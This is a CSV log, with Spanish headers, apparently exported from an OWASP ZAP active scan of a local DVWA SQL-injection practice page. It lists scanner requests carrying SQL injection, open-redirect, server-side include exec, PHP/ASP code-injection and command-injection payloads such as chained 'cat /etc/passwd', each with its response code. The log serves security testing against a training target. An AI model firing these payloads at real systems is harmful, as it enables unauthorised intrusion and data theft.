ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
23,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/3944188755050753324,404,Not Found,3,161,311
25,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
26,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%2F&Submit=Submit,302,Found,2,628,0
27,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%3A80%2F&Submit=Submit,302,Found,1,628,0
28,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com&Submit=Submit,302,Found,1,628,0
29,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
30,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,2,628,0
31,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%2F&Submit=Submit,302,Found,1,628,0
32,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%3A80%2F&Submit=Submit,302,Found,2,628,0
33,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com&Submit=Submit,302,Found,1,628,0
34,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
35,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=www.google.com%3A80%2Fsearch%3Fq%3DZAP&Submit=Submit,302,Found,1,628,0
36,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%2F,302,Found,2,628,0
37,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%3A80%2F,302,Found,1,628,0
38,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com,302,Found,2,628,0
39,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
40,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2Fwww.google.com%3A80%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
41,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%2F,302,Found,1,628,0
42,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%3A80%2F,302,Found,1,628,0
43,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com,302,Found,1,628,0
44,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
45,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=www.google.com%3A80%2Fsearch%3Fq%3DZAP,302,Found,1,628,0
46,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,2,224,366
47,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=2513925798262360428.owasp.org&Submit=Submit,302,Found,2,628,0
48,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F2513925798262360428.owasp.org&Submit=Submit,302,Found,1,628,0
49,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F2513925798262360428%252eowasp%252eorg&Submit=Submit,302,Found,1,628,0
50,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%27&Submit=Submit,302,Found,1,628,0
51,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=URL%3D%27http%3A%2F%2F2513925798262360428.owasp.org%27&Submit=Submit,302,Found,1,628,0
52,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F2513925798262360428.owasp.org%2F%3F1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,2,628,0
53,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%2F%3F1%27+OR+%271%27%3D%271%27&Submit=Submit,302,Found,1,628,0
54,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=https%3A%2F%2F%5C2513925798262360428.owasp.org&Submit=Submit,302,Found,1,628,0
55,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=http%3A%2F%2F%5C2513925798262360428.owasp.org&Submit=Submit,302,Found,1,628,0
56,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=2513925798262360428.owasp.org,302,Found,1,628,0
57,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F2513925798262360428.owasp.org,302,Found,1,628,0
58,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F2513925798262360428%252eowasp%252eorg,302,Found,1,628,0
59,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%27,302,Found,2,628,0
60,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=URL%3D%27http%3A%2F%2F2513925798262360428.owasp.org%27,302,Found,2,628,0
61,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F2513925798262360428.owasp.org%2F%3FSubmit,302,Found,1,628,0
62,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=5%3BURL%3D%27https%3A%2F%2F2513925798262360428.owasp.org%2F%3FSubmit%27,302,Found,1,628,0
63,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=https%3A%2F%2F%5C2513925798262360428.owasp.org,302,Found,1,628,0
64,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=http%3A%2F%2F%5C2513925798262360428.owasp.org,302,Found,1,628,0
65,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,3,224,366
66,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&Submit=Submit,200,OK,2,613,1342
67,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&Submit=Submit,200,OK,2,613,1342
68,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&Submit=Submit,200,OK,1,613,1342
69,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&Submit=Submit,200,OK,1,613,1342
70,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,200,OK,4,613,1342
71,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C,200,OK,1,613,1342
72,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E,200,OK,1,613,1342
73,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C,200,OK,1,613,1342
74,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,1,224,366
75,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit,302,Found,2,628,0
76,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27&Submit=Submit,302,Found,1,628,0
77,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22&Submit=Submit,302,Found,1,628,0
78,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22&Submit=Submit,302,Found,1,628,0
79,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3B&Submit=Submit,302,Found,1,628,0
80,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3B&Submit=Submit,302,Found,1,628,0
81,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%27%28&Submit=Submit,302,Found,1,628,0
82,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%28&Submit=Submit,302,Found,1,628,0
83,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
84,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,2,628,0
85,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+AND+1%3D1+--+&Submit=Submit,302,Found,1,628,0
86,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+AND+1%3D2+--+&Submit=Submit,302,Found,2,628,0
87,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+OR+1%3D1+--+&Submit=Submit,302,Found,1,628,0
88,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+AND+%271%27%3D%271%27+--+&Submit=Submit,302,Found,1,628,0
89,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+AND+%271%27%3D%272%27+--+&Submit=Submit,302,Found,1,628,0
90,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+OR+%271%27%3D%271%27+--+&Submit=Submit,302,Found,1,628,0
91,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,0,628,0
92,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
93,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
94,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%29+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
95,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%29+UNION+ALL+select+NULL+--+&Submit=Submit,302,Found,1,628,0
96,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,0,628,0
97,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27,302,Found,1,628,0
98,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27,302,Found,1,628,0
99,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22,302,Found,1,628,0
100,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22,302,Found,0,628,0
101,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3B,302,Found,0,628,0
102,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3B,302,Found,2,628,0
103,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27%28,302,Found,1,628,0
104,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%28,302,Found,0,628,0
105,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
106,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
107,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+AND+1%3D1+--+,302,Found,1,628,0
108,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+AND+1%3D2+--+,302,Found,1,628,0
109,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+OR+1%3D1+--+,302,Found,1,628,0
110,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+AND+%271%27%3D%271%27+--+,302,Found,1,628,0
111,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+AND+%271%27%3D%272%27+--+,302,Found,1,628,0
112,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+OR+%271%27%3D%271%27+--+,302,Found,1,628,0
113,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit+UNION+ALL+select+NULL+--+,302,Found,1,628,0
114,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27+UNION+ALL+select+NULL+--+,302,Found,1,628,0
115,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22+UNION+ALL+select+NULL+--+,302,Found,1,628,0
116,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%29+UNION+ALL+select+NULL+--+,302,Found,1,628,0
117,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%29+UNION+ALL+select+NULL+--+,302,Found,1,628,0
118,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit,302,Found,1,628,0
119,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,3,224,366
120,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22&Submit=Submit,302,Found,3,628,0
121,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27&Submit=Submit,302,Found,2,628,0
122,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D&Submit=Submit,302,Found,1,628,0
123,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C&Submit=Submit,302,Found,1,628,0
124,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B&Submit=Submit,302,Found,1,628,0
125,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%22%2Bresponse.write%28931%2C583*553%2C682%29%2B%22&Submit=Submit,302,Found,1,628,0
126,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B&Submit=Submit,302,Found,1,628,0
127,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=response.write%28931%2C583*553%2C682%29&Submit=Submit,302,Found,1,628,0
128,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22,302,Found,1,628,0
129,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,302,Found,1,628,0
130,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,302,Found,1,628,0
131,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,302,Found,1,628,0
132,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,302,Found,0,628,0
133,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2Bresponse.write%28839%2C311*943%2C382%29%2B%22,302,Found,1,628,0
134,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,302,Found,1,628,0
135,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=response.write%28839%2C311*943%2C382%29,302,Found,1,628,0
136,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=cat+%2Fetc%2Fpasswd&Submit=Submit,302,Found,1,628,0
137,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26cat+%2Fetc%2Fpasswd%26&Submit=Submit,302,Found,1,628,0
138,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,5,224,366
139,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bcat+%2Fetc%2Fpasswd%3B&Submit=Submit,302,Found,1,628,0
140,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26cat+%2Fetc%2Fpasswd%26%22&Submit=Submit,302,Found,2,628,0
141,Thu Mar 19 10:06:38 CST 2026,Thu Mar 19 10:06:38 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bcat+%2Fetc%2Fpasswd%3B%22&Submit=Submit,302,Found,0,628,0
